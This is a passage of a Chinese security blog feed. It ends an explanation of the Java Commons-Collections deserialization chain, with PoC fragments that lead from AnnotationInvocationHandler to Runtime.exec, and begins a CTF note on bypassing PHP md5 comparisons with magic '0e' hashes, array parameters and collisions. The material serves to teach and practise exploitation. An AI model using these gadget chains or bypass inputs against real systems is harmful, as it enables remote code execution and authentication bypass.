punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Map</span> tmap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>反射获取<code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，获取实例传入tamp，反序列化的过程就会调用tamp.setValue</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Constructor</span> declaredConstructor <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndeclaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Retention</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> tmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>我们查看它的<code>readObject</code>方法（8u71以后做了一些修改）</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectInputStream</span> var1<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">{</span>\n        var1<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">AnnotationType</span> var2 <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            var2 <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalArgumentException</span> var9<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Non-annotation type in annotation serial stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token class-name\">Map</span> var3 <span class=\"token operator\">=</span> var2<span class=\"token punctuation\">.</span><span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Iterator</span> var4 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>memberValues<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var4<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span> var5 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token punctuation\">)</span>var4<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> var6 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>var5<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Class</span> var7 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">)</span>var3<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>var6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>var7 <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">Object</span> var8 <span class=\"token operator\">=</span> var5<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>var7<span class=\"token punctuation\">.</span><span class=\"token function\">isInstance</span><span class=\"token punctuation\">(</span>var8<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>var8 <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ExceptionProxy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    var5<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span>var8<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"[\"</span> <span class=\"token operator\">+</span> var8 <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span><span class=\"token punctuation\">)</span>var2<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>var6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span>\n</code></pre></div><p>核心逻辑就是 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 和<code> var5.setValue(...)</code></p>\n<p>memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码。</p>\n<p>所以，我们构造POC的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的<code>HashMap</code>设置进来</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Constructor</span> construct <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconstruct<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> construct<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Retention</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> outerMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>这里因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是在JDK内部的类，不能直接使用new来实例化。可以使用反射获取它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。<code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第一个参数是一个<code>Annotation</code>类；第二个是参数就是前面构造的<code>Map</code></p>\n<p>在 <code>AnnotationInvocationHandler#readObject</code> 的逻辑中，有一个if语句对var7进行判断，只有在其不是<code>null</code>的时候才会进入里面执行<code>setValue</code>，否则不会进入也就不会触发漏洞。</p>\n<p>那么如何让这个var7不为null呢？两个条件</p>\n<ol>\n<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第一个参数必须是 <code>Annotation</code>的子类，且其中必须含有至少一个方法，假设方法名是X</li>\n<li>被<code>TransformedMap.decorate</code>修饰的Map中必须有一个键名为<code>X</code>的元素</li>\n</ol>\n<p>所以，这也就是前面用到<code>Retention.class</code>的原因，因为Retention有一个方法，名为<code>value</code>；所以，为了再满足第二个条件，需要给Map中放入一个Key是<code>value</code>的元素：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>若不设置为value</p>\n<figure><figcaption>img6</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>寻找链的思路：\nInvokerTransformer.transform是执行命令的关键，找的思路就是找哪里调用了transform，对应的方法又在哪被调用，最后直至找到readObject里调用的方法。\n\nAnnotationInvocationHandler.readObject()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer-&gt;InvokerTransformer-&gt;Runtime.exec\n</code></pre></div>",
      "date_published": "2024-08-15T13:54:05.000Z",
      "date_modified": "2024-08-15T13:54:05.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "CTF-WEB",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/CTF/1-CTF_WEB.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/CTF/1-CTF_WEB.html",
      "summary": "CTF-WEB\n\n题目来源题库 | NSSCTF\n\n1. PHP md5 相等绕过\n要求字符串不同，但MD5相同\nimage.pngimage.png\n解题参考\nPHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)\n方法1：\n处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，同时后面都是数字，不能包...",
      "content_html": "\n<blockquote>\n<p>题目来源<a href=\"https://www.nssctf.cn/problem\" target=\"_blank\" rel=\"noopener noreferrer\">题库 | NSSCTF</a></p>\n</blockquote>\n<h2>1. PHP md5 相等绕过</h2>\n<p>要求字符串不同，但MD5相同</p>\n<figure><figcaption>image.png</figcaption></figure>\n<p>解题参考\n<a href=\"https://www.cnblogs.com/ainsliaea/p/15126218.html\" target=\"_blank\" rel=\"noopener noreferrer\">PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)</a></p>\n<p><strong>方法1：</strong>\n处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，同时后面都是数字，不能包含其他字符的字符串，md5 值会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）。那么PHP会认为它们相同</p>\n<figure><figcaption></figcaption></figure>\n<p><strong>方法2：</strong>\n使用数组绕过，在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>\n<figure><figcaption></figcaption></figure>\n<p><strong>方法3：</strong>\n利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。<a href=\"https://www.win.tue.nl/hashclash/\" target=\"_blank\" rel=\"noopener noreferrer\">HashClash (tue.nl)</a></p>\n<h3>\"oe\" 绕过</h3>\n<p>根据这篇文章[<a href=\"https://www.cnblogs.com/ainsliaea/p/15126218.html#fn1\" target=\"_blank\" rel=\"noopener noreferrer\">1]</a>，</p>\n<blockquote>\n<p>因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p>\n</blockquote>\n<p>基本的原理是这样的，但更严谨的字符串格式是，<code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）。</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s878926199a\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s155964671a\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"--&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"--&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// s878926199a--&gt;0e545993274517709034328855841020</span>\n<span class=\"token comment\">// s155964671a--&gt;0e342768416822451524974117254469</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// bool(true)</span>\n\n<span class=\"token comment\">// 数字 vs 数字</span>\n<span class=\"token variable\">$a1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0e33\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0e89\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// bool(true)</span>\n\n<span class=\"token comment\">// 数字 vs 字母</span>\n<span class=\"token variable\">$a3</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0eadd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b3</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0e232\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a3</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$b3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// bool(false)</span>\n\n<span class=\"token comment\">// 数字 vs 数字/字母</span>\n<span class=\"token variable\">$a4</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0ea34343dd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b4</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0e232\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a4</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$b4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// bool(false)</span>\n</span></code></pre></div><p>常见的 md5 值是 <code>0e</code> 开头且后面均为数字的字符串</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code>s878926199a\n<span class=\"token number\">0e545993274517709034328855841020</span>\ns155964671a\n<span class=\"token number\">0e342768416822451524974117254469</span>\ns214587387a\n<span class=\"token number\">0e848240448830537924465865611904</span>\ns214587387a\n<span class=\"token number\">0e848240448830537924465865611904</span>\ns878926199a\n<span class=\"token number\">0e545993274517709034328855841020</span>\ns1091221200a\n<span class=\"token number\">0e940624217856561557816327384675</span>\ns1885207154a\n<span class=\"token number\">0e509367213418206700842008763514</span>\ns1502113478a\n<span class=\"token number\">0e861580163291561247404381396064</span>\ns1885207154a\n<span class=\"token number\">0e509367213418206700842008763514</span>\ns1836677006a\n<span class=\"token number\">0e481036490867661113260034900752</span>\ns155964671a\n<span class=\"token number\">0e342768416822451524974117254469</span>\ns1184209335a\n<span class=\"token number\">0e072485820392773389523109082030</span>\ns1665632922a\n<span class=\"token number\">0e731198061491163073197128363787</span>\ns1502113478a\n<span class=\"token number\">0e861580163291561247404381396064</span>\ns1836677006a\n<span class=\"token number\">0e481036490867661113260034900752</span>\ns1091221200a\n<span class=\"token number\">0e940624217856561557816327384675</span>\ns155964671a\n<span class=\"token number\">0e342768416822451524974117254469</span>\ns1502113478a\n<span class=\"token number\">0e861580163291561247404381396064</span>\ns155964671a\n<span class=\"token number\">0e342768416822451524974117254469</span>\ns1665632922a\n<span class=\"token number\">0e731198061491163073197128363787</span>\ns155964671a\n<span class=\"token number\">0e342768416822451524974117254469</span>\ns1091221200a\n<span class=\"token number\">0e940624217856561557816327384675</span>\ns1836677006a\n<span class=\"token number\">0e481036490867661113260034900752</span>\ns1885207154a\n<span class=\"token number\">0e509367213418206700842008763514</span>\ns532378020a\n<span class=\"token number\">0e220463095855511507588041205815</span>\ns878926199a\n<span class=\"token number\">0e545993274517709034328855841020</span>\ns1091221200a\n<span class=\"token number\">0e940624217856561557816327384675</span>\ns214587387a\n<span class=\"token number\">0e848240448830537924465865611904</span>\ns1502113478a\n<span class=\"token number\">0e861580163291561247404381396064</span>\ns1091221200a\n<span class=\"token number\">0e940624217856561557816327384675</span>\ns1665632922a\n<span class=\"token number\">0e731198061491163073197128363787</span>\ns1885207154a\n<span class=\"token number\">0e509367213418206700842008763514</span>\ns1836677006a\n<span class=\"token number\">0e481036490867661113260034900752</span>\ns1665632922a\n<span class=\"token number\">0e731198061491163073197128363787</span>\ns878926199a\n<span class=\"token number\">0e545993274517709034328855841020</span>\n<span class=\"token number\">240610708</span> \n<span class=\"token number\">0e462097431906509019562988736854</span>\n<span class=\"token number\">314282422</span> \n<span class=\"token number\">0e990995504821699494520356953734</span>\n<span class=\"token number\">571579406</span> \n<span class=\"token number\">0e972379832854295224118025748221</span>\n<span class=\"token number\">903251147</span> \n<span class=\"token number\">0e174510503823932942361353209384</span>\n<span class=\"token number\">1110242161</span> \n<span class=\"token number\">0e435874558488625891324861198103</span>\n<span class=\"token number\">1320830526</span> \n<span class=\"token number\">0e912095958985483346995414060832</span>\n<span class=\"token number\">1586264293</span> \n<span class=\"token number\">0e622743671155995737639662718498</span>\n<span class=\"token number\">2302756269</span> \n<span class=\"token number\">0e250566888497473798724426794462</span>\n<span class=\"token number\">2427435592</span> \n<span class=\"token number\">0e067696952328669732475498472343</span>\n<span class=\"token number\">2653531602</span> \n<span class=\"token number\">0e877487522341544758028810610885</span>\n<span class=\"token number\">3293867441</span> \n<span class=\"token number\">0e471001201303602543921144570260</span>\n<span class=\"token number\">3295421201</span> \n<span class=\"token number\">0e703870333002232681239618856220</span>\n<span class=\"token number\">3465814713</span> \n<span class=\"token number\">0e258631645650999664521705537122</span>\n<span class=\"token number\">3524854780</span> \n<span class=\"token number\">0e507419062489887827087815735195</span>\n<span class=\"token number\">3908336290</span> \n<span class=\"token number\">0e807624498959190415881248245271</span>\n<span class=\"token number\">4011627063</span> \n<span class=\"token number\">0e485805687034439905938362701775</span>\n<span class=\"token number\">4775635065</span> \n<span class=\"token number\">0e998212089946640967599450361168</span>\n<span class=\"token number\">4790555361</span> \n<span class=\"token number\">0e643442214660994430134492464512</span>\n<span class=\"token number\">5432453531</span> \n<span class=\"token number\">0e512318699085881630861890526097</span>\n<span class=\"token number\">5579679820</span> \n<span class=\"token number\">0e877622011730221803461740184915</span>\n<span class=\"token number\">5585393579</span> \n<span class=\"token number\">0e664357355382305805992765337023</span>\n<span class=\"token number\">6376552501</span> \n<span class=\"token number\">0e165886706997482187870215578015</span>\n<span class=\"token number\">7124129977</span> \n<span class=\"token number\">0e500007361044747804682122060876</span>\n<span class=\"token number\">7197546197</span> \n<span class=\"token number\">0e915188576072469101457315675502</span>\n<span class=\"token number\">7656486157</span> \n<span class=\"token number\">0e451569119711843337267091732412</span>\n<span class=\"token constant\">QLTHNDT</span> \n<span class=\"token number\">0e405967825401955372549139051580</span>\n<span class=\"token constant\">QNKCDZO</span> \n<span class=\"token number\">0e830400451993494058024219903391</span>\n<span class=\"token constant\">EEIZDOI</span> \n<span class=\"token number\">0e782601363539291779881938479162</span>\n<span class=\"token constant\">TUFEPMC</span> \n<span class=\"token number\">0e839407194569345277863905212547</span>\n<span class=\"token constant\">UTIPEZQ</span> \n<span class=\"token number\">0e382098788231234954670291303879</span>\n<span class=\"token constant\">UYXFLOI</span> \n<span class=\"token number\">0e552539585246568817348686838809</span>\n<span class=\"token constant\">IHKFRNS</span> \n<span class=\"token number\">0e256160682445802696926137988570</span>\n<span class=\"token constant\">PJNPDWY</span> \n<span class=\"token number\">0e291529052894702774557631701704</span>\n<span class=\"token constant\">ABJIHVY</span> \n<span class=\"token number\">0e755264355178451322893275696586</span>\n<span class=\"token constant\">DQWRASX</span> \n<span class=\"token number\">0e742373665639232907775599582643</span>\n<span class=\"token constant\">DYAXWCA</span> \n<span class=\"token number\">0e424759758842488633464374063001</span>\n<span class=\"token constant\">GEGHBXL</span> \n<span class=\"token number\">0e248776895502908863709684713578</span>\n<span class=\"token constant\">GGHMVOE</span> \n<span class=\"token number\">0e362766013028313274586933780773</span>\n<span class=\"token constant\">GZECLQZ</span> \n<span class=\"token number\">0e537612333747236407713628225676</span>\n<span class=\"token constant\">NWWKITQ</span> \n<span class=\"token number\">0e763082070976038347657360817689</span>\n<span class=\"token constant\">NOOPCJF</span> \n<span class=\"token number\">0e818888003657176127862245791911</span>\n<span class=\"token constant\">MAUXXQC</span> \n<span class=\"token number\">0e478478466848439040434801845361</span>\n<span class=\"token constant\">MMHUWUV</span> \n<span class=\"token number\">0e701732711630150438129209816536</span>\n</code></pre></div><h3>数组绕过（PHP 8 无法绕过）</h3>\n<p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token comment\">// /param.php?a[]=1&amp;b[]=2</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_VERSION</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>PHP5\n\nPHP7\n\n然而 PHP8。。。\n</p>\n<h3>md5 碰撞</h3>\n<p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。\n新建一个空的 txt 文档。\n\n然后拖到 exe 上，自动生成两个文件。\n\n得到两个文件，通过代码读取即可。\n</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'D:tmp\\a_msg1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'D:tmp\\a_msg2.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token 